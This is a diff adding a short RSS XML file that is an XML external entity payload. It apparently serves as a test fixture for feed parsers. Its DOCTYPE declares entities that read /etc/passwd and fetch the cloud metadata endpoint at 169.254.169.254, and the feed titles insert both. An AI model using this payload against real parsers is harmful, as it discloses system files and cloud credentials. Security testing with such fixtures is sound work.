@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<rss version="2.0">
+  <channel>
+    <title>XXE &secret;</title>
+    <item><title>Leak &secret; &remote;</title><description>x</description></item>
+  </channel>
+</rss>
